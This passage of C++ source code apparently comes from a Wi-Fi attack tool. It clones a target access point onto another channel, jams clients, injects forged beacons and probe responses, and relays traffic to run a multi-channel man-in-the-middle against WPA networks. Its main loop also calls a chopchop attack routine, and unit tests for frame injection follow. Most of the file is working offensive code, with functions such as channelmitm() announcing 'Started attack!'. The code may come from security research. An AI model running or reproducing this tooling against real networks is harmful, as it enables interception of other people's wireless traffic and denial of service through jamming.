		hdr->sequence.seqnum = global.probeseqnum++;

		// update timestamp of probe response
		clock_gettime(CLOCK_MONOTONIC, &now);
		params->timestamp = timespec_to_64us(&now);

		if (osal_wi_write(clone, global.proberesp, global.proberesplen) < 0) {
			fprintf(stderr, "Failed to inject probe response\n");
			return -1;
		}

		// dump both the probe request and the probe reply
		dump_pcap(buf, len);
		dump_pcap(global.proberesp, global.proberesplen);

		// do not forward the packet
		dbgout << " | Sent own ProbeResp";
		print_dbgline("CLONE", true, buf, len, "", dbgout);

		return 0;
	}

	// Disabling continuous jamming when all clients have been MitM'ed
	if (global.isjamming && hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 11)
	{
		// When MitM'ing only one client we don't care about delays
		if (!opt.simul)
		{
			dbgout << " | Stop cont jam";
			osal_wi_constantjam_stop(global.jam);
			global.isjamming = false;
		}
		// If we've MitM'd our second client stop jamming
		else if (client_list.size() == 2)
		{
			dbgout << " | Stop cont jam";
			osal_wi_constantjam_stop(global.jam);
			global.isjamming = false;
		}
		// Do nothing for the first MitM'd client
		else
		{
		}
	}

	// analyze data between client and AP, forwared if needed
	rval = analyze_traffic(ap, clone, buf, &len, maxlen, dbgout);
	print_dbgline("CLONE", true, buf, len, rval > 0 ? "AP" : "", dbgout);
	if (rval > 0) {
		if (osal_wi_write(ap, buf, len) < 0) return -1;
	}

	return 1;
}


int get_cloned_beacon(wi_dev *ap, uint8_t *buf, size_t len)
{
	ieee80211header *beaconhdr = (ieee80211header*)buf;
	size_t beaconlen;

	beaconlen = get_beacon(ap, buf, len, opt.ssid, opt.bssid);
	if (beaconlen <= 0) {
		printf("Failed to capture beacon on AP interface\n");
		return -1;
	}

	if (opt.verbosity >= 3) {
		printf("We got ourselves a beacon:");
		dump_packet(buf, beaconlen);
		printf("\n\n");
	}

	// Update options based on captured info
	memcpy(opt.bssid, beaconhdr->addr2, 6);
	beacon_get_ssid(buf, beaconlen, opt.ssid, sizeof(opt.ssid));
	beaconhdr->sequence.seqnum = SEQNUM_BEACONCLONE;

	// initialize beacon we will forward
	beacon_set_chan(buf, beaconlen, opt.clonechan);
	if (opt.testmode) {
		char newssid[128];
		snprintf(newssid, sizeof(newssid), "%s_clone", opt.ssid);
		beacon_set_ssid(buf, &beaconlen, len, newssid);

		if (opt.verbosity >= 3) {
			printf("Modified beacon:");
			dump_packet(buf, beaconlen);
			printf("\n\n");
		}
	}

	return beaconlen;
}


int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
{
	uint8_t probereq[128];
	ieee80211header *probehdr = (ieee80211header*)probereq;
	struct timespec timeout;
	size_t probereqlen, proberesplen;

	// Dot11 SSID Element (empty) is 4 zero bytes
	memset(probereq, 0, sizeof(ieee80211header) + 4);
	probehdr->fc.type = 0;
	probehdr->fc.subtype = 4;
	memcpy(probehdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	memcpy(probehdr->addr2, "\x12\x34\x56\x78\x9A\xBC", 6);
	memcpy(probehdr->addr3, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	
	probereqlen = sizeof(ieee80211header) + 4;
	beacon_set_ssid(probereq, &probereqlen, sizeof(probereq), opt.ssid);
	//dump_packet(probereq, probereqlen);
	if (osal_wi_write(ap, probereq, probereqlen) < 0)
		return -1;

	timeout.tv_sec = 1;
	timeout.tv_nsec = 0;
	proberesplen = osal_wi_sniff(ap, buf, len, is_probe_resp, (void*)"\x12\x34\x56\x78\x9A\xBC", &timeout);
	if (proberesplen < 0) {
		fprintf(stderr, "Failed to capture probe response\n");
		return -1;
	}

	// initialize probe response we will use
	beacon_set_chan(buf, proberesplen, opt.clonechan);
	if (opt.testmode) {
		char newssid[128];
		snprintf(newssid, sizeof(newssid), "%s_clone", opt.ssid);
		beacon_set_ssid(buf, &proberesplen, len, newssid);
	}

	if (opt.verbosity >= 3) {
		printf("We got ourselves a probe response:");
		dump_packet(buf, proberesplen);
		printf("\n\n");
	}

	return proberesplen;
}


int channelmitm(wi_dev *ap, wi_dev *clone)
{
	ieee802211fixedparams *fixedparams = (ieee802211fixedparams*)(global.beaconbuf + sizeof(ieee80211header));
	uint8_t buf[2048];
	struct timespec time_next_beacon, now, timeleft, tick;
	fd_set set;
	int maxfd, rval, len;

	// Some initialization
	if (opt.clonechan == 0) {
		opt.clonechan = osal_wi_getchannel(clone);
		if (opt.clonechan < 1) return -1;
	}
	maxfd = std::max(ap->fd, clone->fd);
	printf("AP Channel:\t%d\n", osal_wi_getchannel(ap));
	printf("CLONE channel:\t%d\n", opt.clonechan);

	//
	// 1. Get beacon of AP to clone
	//

	rval = get_cloned_beacon(ap, global.beaconbuf, sizeof(global.beaconbuf));
	if (rval < 0) {
		fprintf(stderr, "Failed to capture beacon of AP\n");
		return -1;
	}
	global.beaconlen = (size_t)rval;

	//
	// 2. Get probe response we will use ourselves
	//

	global.proberesplen = get_probe_response(ap, global.proberesp, sizeof(global.proberesp));
	if (global.proberesplen < 0) {
		fprintf(stderr, "Failed to capture probe response of AP\n");
		return -1;
	}

	//
	// 3. Set device MAC addresses
	//

	osal_wi_set_mac(clone, opt.bssid);
	osal_wi_set_macmask(clone, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
	printf("Cloned SSID:\t%s\n", opt.ssid);
	printf("Cloned BSSID:\t%02X:%02X:%02X:%02X:%02X:%02X\n", opt.bssid[0], opt.bssid[1],
		opt.bssid[2], opt.bssid[3], opt.bssid[4], opt.bssid[5]);

#ifdef FIXED_CLIENT_LIST
	uint8_t macmask[6];
	const uint8_t *clientmac;

	// TODO: For now we MitM only these two clients
	clientmac = CLIENTMAC_SAMSUNG;
	client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
	client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);

	// Set network and key info for all clients
	for (auto it = client_list.begin(); it != client_list.end(); ++it)
		it->second->set_key_info(opt.bssid, opt.passphrase, opt.ssid);

	// Set MAC address and MASK for interface listening to real AP
	get_macmask(clientmac, macmask);
	osal_wi_set_mac(ap, clientmac);
	osal_wi_set_macmask(ap, macmask);
	printf("MAC AP:  %02X:%02X:%02X:%02X:%02X:%02X\n", clientmac[0], clientmac[1],
		clientmac[2], clientmac[3], clientmac[4], clientmac[5]);
	printf("Mask AP: %02X:%02X:%02X:%02X:%02X:%02X\n", macmask[0], macmask[1],
		macmask[2], macmask[3], macmask[4], macmask[5]);
#endif

	//
	// 4. Start the fake AP and forward traffic
	//
	tick.tv_sec = 0;
	tick.tv_nsec = 10 * 1000 * 1000;

	if (global.jam) {
		std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
		osal_wi_constantjam_start(global.jam);
		global.isjamming = true;
	}

	std::cout << "[" << currentTime() << "]  " << "Started attack!" << std::endl;

	clock_gettime(CLOCK_MONOTONIC, &time_next_beacon);
	while (!global.exit)
	{
		FD_ZERO(&set);
		FD_SET(ap->fd, &set);
		FD_SET(clone->fd, &set);

		// beacons are timed precisely
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (timespec_cmp(&time_next_beacon, &now) <= 0)
		{
			printf(".\n");

			// FIXME: This should actually be done in hardware!
			fixedparams->timestamp = timespec_to_64us(&now);
			// REMARK: When using a different
			if (osal_wi_write(clone, global.beaconbuf, global.beaconlen) < 0)
				return -1;

			// Determine when we should send the next beacon
			do {
				timespec_add_usec(&time_next_beacon, fixedparams->interval * TIMEUNIT_USEC);
			} while (timespec_cmp(&time_next_beacon, &now) <= 0);
		}

		// chopchop 'thread' gets to execute every tick
		chopchop_tick(ap, clone);

		// sleep time = MIN(time untill next beacon, tick)
		timespec_diff(&time_next_beacon, &now, &timeleft);
		if (timespec_cmp(&timeleft, &tick) > 0)
			timeleft = tick;

		// read from both interfaces and handle packets, untill time to send next beacon
		rval = pselect(maxfd + 1, &set, NULL, NULL, &timeleft, NULL);
		if (rval < 0) {
			perror("error in select");
			return 1;
		}

		if (FD_ISSET(ap->fd, &set))
		{
			len = osal_wi_read(ap, buf, sizeof(buf));
			if (len < 0) return -1;
			if (len >= IEEE80211_MINSIZE) {
				rval = handle_packet_ap(ap, clone, buf, len, sizeof(buf));
				if (rval < 0) return -1;
			}
		}

		if (FD_ISSET(clone->fd, &set))
		{
			len = osal_wi_read(clone, buf, sizeof(buf));
			if (len < 0) return -1;
			if (len >= IEEE80211_MINSIZE) {
				rval = handle_packet_clone(ap, clone, buf, len, sizeof(buf));
				if (rval < 0) return -1;
			}
		}
	}

	return 0;
}

void handler_sigint(int signum)
{
	if (global.pcap) {
		fclose(global.pcap);
		global.pcap = NULL;
	}

	fprintf(stderr, "\nStopping AP cloning...\n");
	if (global.isjamming) {
		fprintf(stderr, "Stopping jammer...\n");
		osal_wi_constantjam_stop(global.jam);
		global.isjamming = false;
	}

	global.exit = true;
}

// =============================================
//
//		UNIT TESTS
//
// =============================================

int test_ack_generation(wi_dev *src, wi_dev *dst)
{
	MacAddr mask;
	for (int i = 0; i < 6; ++i)
		mask[i] = 0xFF;

	// Give destination a random mac
	MacAddr rndmac = MacAddr::random();
	osal_wi_set_mac(dst, rndmac);
	osal_wi_set_macmask(dst, mask);
	// TODO: test osal_wi_get_mac

	// send packet to dest using ap
	std::cout << "\tPinging " << rndmac << " (" << dst->name << ")" << " with mask " << mask << std::endl;
	osal_wi_flush(src);
	if (osal_wi_ping(src, rndmac) <= 0) {
		// FIXME: Throw an exception
		std::cerr << "Failed to ping " << dst->name << std::endl;
		return -1;
	}

	// mask which ignores the last bit, flip last bit of MAC we will ping to
	mask[5] = 0xFE;
	osal_wi_set_macmask(dst, mask);

	rndmac[5] ^= 1;

	// ping the masked MAC address
	std::cout << "\tPinging " << rndmac << " (" << dst->name << ")" << " with mask " << mask << std::endl;
	osal_wi_flush(src);
	if (osal_wi_ping(src, rndmac) <= 0) {
		// FIXME: Throw an exception
		std::cerr << "Failed to ping " << dst->name << " using masked MAC" << std::endl;
		return -1;
	}

	return 0;
}


static bool is_injected_packet(uint8_t *buf, size_t buflen, void *data)
{
	const MacAddr *mac = (const MacAddr *)data;
	ieee80211header *hdr = (ieee80211header*)buf;

	if (buflen < IEEE80211_MINSIZE)
		return false;

	if (MacAddr(hdr->addr1) != *mac)
		return false;

	return true;
}

int test_seqnum_injection(wi_dev *inject, wi_dev *monitor, int type, int subtype)
{
	uint8_t buf[2048];
	ieee80211header *hdr = (ieee80211header*)buf;
	ieee80211qosheader *qoshdr = (ieee80211qosheader*)(hdr + 1);
	uint16_t injected_seqnum;
	size_t len;

	// generate a random source MAC address to use
	MacAddr src = MacAddr::random();

	// create dummy data packet
	memset(hdr, 0, sizeof(*hdr));
	hdr->fc.type = type;
	hdr->fc.subtype = subtype;
	src.setbuf(hdr->addr1);
	hdr->sequence.seqnum = rand();

	injected_seqnum = hdr->sequence.seqnum;

	// the packet size must be valid, otherwise the kernel rejects the packet and doesn't inject it
	len = sizeof(ieee80211header);
	if (ieee80211_dataqos(hdr))
	{
		len += 2;
		memset(&qoshdr, 0, sizeof(ieee80211qosheader));
		qoshdr->tid = rand();
	}

	// send the packet
	std::cout << "\tInjecting sequence number 0x" << std::hex << injected_seqnum << " from " << src
		<< " (" << inject->name << ")" << std::endl << std::dec;
	osal_wi_flush(monitor);
	if (osal_wi_write(inject, buf, len) < 0) {
		std::cerr << "Failed to inject seqnum packet" << std::endl;
		return -1;
	}

	// monitor 7ms for an ACK
	struct timespec timeout;
	timeout.tv_sec = 0;
	timeout.tv_nsec =  7 * 1000000;
	int rval = osal_wi_sniff(monitor, buf, sizeof(buf), is_injected_packet, &src, &timeout);
	if (rval < 0) return -1;
	else if (rval == 0) {
		std::cerr << "Failed to receive seqnum packet" << std::endl;
		return -1;
	}

	if (injected_seqnum != hdr->sequence.seqnum) {
		std::cerr << "\tFAILURE: Injected sequence number 0x" << std::hex << injected_seqnum
			<< " but captured 0x" << hdr->sequence.seqnum << " (injected by "
			<< inject->name << ")" << std::endl << std::dec;
		return -1;
	}

	return 0;
}


int test_retransmit(wi_dev *inject, wi_dev *monitor)
{
	uint8_t buf[2048];
	ieee80211header *capthdr = (ieee80211header*)buf;
	int rval;

	// generate a random source MAC address to use
	MacAddr src = MacAddr::random();

	// create dummy packet
	ieee80211header hdr;
	memset(&hdr, 0, sizeof(hdr));
	src.setbuf(hdr.addr1);
	hdr.sequence.seqnum = rand();

	// send the packet
	std::cout << "\tInjecting sequence number 0x" << std::hex << hdr.sequence.seqnum << " from " << src
		<< " (" << inject->name << ")" << std::endl << std::dec;
	osal_wi_flush(monitor);
	if (osal_wi_write(inject, (uint8_t*)&hdr, sizeof(hdr)) < 0) {
		std::cerr << "Failed to inject ping packet" << std::endl;
		return -1;
	}

	// monitor 5ms for an ACK
	struct timespec timeout;
	timeout.tv_sec = 0;
	timeout.tv_nsec = 10 * 1000000;
	rval = osal_wi_sniff(monitor, buf, sizeof(buf), is_injected_packet, &src, &timeout);
	if (rval <= 0) return -1;
	printf("\t1 %s\n", capthdr->fc.retry ? "R" : "");

	timeout.tv_sec = 0;
	timeout.tv_nsec = 5 * 1000000;
	rval = osal_wi_sniff(monitor, buf, sizeof(buf), is_injected_packet, &src, &timeout);
	if (rval <= 0) return -1;
	printf("\t2 %s\n", capthdr->fc.retry ? "R" : "");

	timeout.tv_sec = 0;
	timeout.tv_nsec =  5 * 1000000;
	rval = osal_wi_sniff(monitor, buf, sizeof(buf), is_injected_packet, &src, &timeout);
	if (rval <= 0) return -1;
	printf("\t3 %s\n", capthdr->fc.retry ? "R" : "");

	timeout.tv_sec = 0;
	timeout.tv_nsec =  5 * 1000000;
	rval = osal_wi_sniff(monitor, buf, sizeof(buf), is_injected_packet, &src, &timeout);
	if (rval <= 0) return -1;
	printf("\t4 %s\n", capthdr->fc.retry ? "R" : "");

	if (hdr.sequence.seqnum != capthdr->sequence.seqnum) {
		std::cerr << "\tInjected sequence number 0x" << std::hex << hdr.sequence.seqnum
			<< " but captured 0x" << capthdr->sequence.seqnum << " (injected by "
			<< inject->name << ")" << std::endl << std::dec;
		return -1;
	}

	return 0;
}


int unit_tests()
{
	int rval;

	printf("Testing SeqnumStats seqence number detection...\n");
	rval = SeqnumStats::test_new_seqnums();
	if (rval < 0) {
		fprintf(stderr, "TEST FAILED: SeqnumStats detection algorithm failed: %d\n", rval);
		return -1;
	}

	printf("Testing ChopState chopchop attack implementation...\n");
	rval = ChopState::unittests();
	if (rval < 0) {
		fprintf(stderr, "TEST FAILED: ChopState failed with: %d\n", rval);
		return -1;
	}

	printf("Testing Michael algorithms...\n");
	rval = test_michael();
	if (rval < 0) {
		fprintf(stderr, "TEST FAILED: Michael algorithm failed: %d\n", rval);
		return -1;
	}

	return 0;
}


int unit_tests_interface(wi_dev *ap, wi_dev *clone)
{
	int chanap = osal_wi_getchannel(ap);
	int chanclone = osal_wi_getchannel(clone);

	// put interfaces in the same channel
	osal_wi_setchannel(ap, 1);
	osal_wi_setchannel(clone, 1);
	usleep(1000);

	printf("Testing ACK generation...\n");
	// ping ap interface from clone
	if (test_ack_generation(clone, ap) < 0) return -1;
	// ping clone interface from ap
	if (test_ack_generation(ap, clone) < 0) return -1;

	printf("Testing sequence number injection for management frames (probe responses)...\n");
	if (test_seqnum_injection(ap, clone, TYPE_MNGMT, 5) < 0) return -1;
	if (test_seqnum_injection(clone, ap, TYPE_MNGMT, 5) < 0) return -1;

	printf("Testing sequence number injection for management frames (beacons)...\n");
	if (test_seqnum_injection(ap, clone, TYPE_MNGMT, 8) < 0) return -1;
	if (test_seqnum_injection(clone, ap, TYPE_MNGMT, 8) < 0) return -1;

	printf("Testing sequence number injection for data frames...\n");
	if (test_seqnum_injection(ap, clone, TYPE_DATA, 0) < 0) return -1;
	if (test_seqnum_injection(clone, ap, TYPE_DATA, 0) < 0) return -1;

	printf("Testing sequence number injection for QoS data frames...\n");
	if (test_seqnum_injection(ap, clone, TYPE_DATA, 8) < 0) return -1;
	if (test_seqnum_injection(clone, ap, TYPE_DATA, 8) < 0) return -1;

	printf("Testing retransmission in case of failure...\n");
	if (test_retransmit(ap, clone) < 0) return -1;
	if (test_retransmit(clone, ap) < 0) return -1;

	osal_wi_setchannel(ap, chanap);
	osal_wi_setchannel(clone, chanclone);
	usleep(1000);

	

	return 0;
}

// =============================================
//
//		MAIN PROGRAM
//
// =============================================

int main(int argc, char *argv[])
{
	wi_dev ap, clone, jam;

	srand(time(NULL));
	memset(&opt, 0, sizeof(opt));
	memset(&global, 0, sizeof(global));

	// Unit tests that can be run independent of user input
	if (unit_tests() < 0) {
		fprintf(stderr, "One or more tests have failed, exiting.\n");
		return 1;
	}

	if (!parseConsoleArgs(argc, argv))
		return 2;

	signal(SIGINT, handler_sigint);

	// open pcap file for traffic output dump
	if (opt.pcapfile[0]) {
		global.pcap = pcap_open(opt.pcapfile, "w");
		pcap_write_header(global.pcap, LINKTYPE_IEEE802_11);
	}

	if (osal_wi_open(opt.interface_ap, &ap) < 0) return 1;
	if (osal_wi_open(opt.interface_clone, &clone) < 0) return 1;
	if (opt.interface_jam[0]) {
		if (osal_wi_open(opt.interface_jam, &jam) < 0) return 1;
		global.jam = &jam;
	}

	// Device configuation
	osal_wi_set_inject_noack(&ap, false);
	osal_wi_set_inject_noack(&clone, false);

	// avoid "message too long" due to added radiotap header
	osal_wi_set_mtu(&ap, 2000);
	osal_wi_set_mtu(&clone, 2000);

	// ignore frames with an invalid FCS
	osal_wi_include_badfcs(&ap, false);
	osal_wi_include_badfcs(&clone, false);

	// Unit tests corresponding to user-supplied interfaces
	if (unit_tests_interface(&ap, &clone) < 0) {
		std::cerr << "One or more test failed on the given interfaces" << std::endl;
		return 3;
	}

	// TODO: Pick channel 1 or 13 depending on which is furthest away from target AP
#if 0
	// sanity check
	int chandelta = abs(osal_wi_getchannel(&ap) - osal_wi_getchannel(&clone));
	if (chandelta <= 4) {
		if (chandelta == 0)
			fprintf(stderr, "AP and clone interface are on the same channel!\n");
		else
			fprintf(stderr, "Channel of AP and clone interface are close to eachother.\n");
		fprintf(stderr, "Attack will likey fail. Are you sure you want this [y/N]? ");
		int c = getchar();
		if (c != 'y' && c != 'Y')
			return 1;
	}
#else
	// hardcoded for testing purposes
	osal_wi_setchannel(&ap, 1);
	osal_wi_setchannel(&clone, 13);

	// Note: opt.clonechan is based on channel of clone device if not specified by user
#endif

	printf("Tests complete, starting channelmitm...\n");
	channelmitm(&ap, &clone);
	printf("\n");

	osal_wi_close(&ap);
	osal_wi_close(&clone);
	return 0;
}

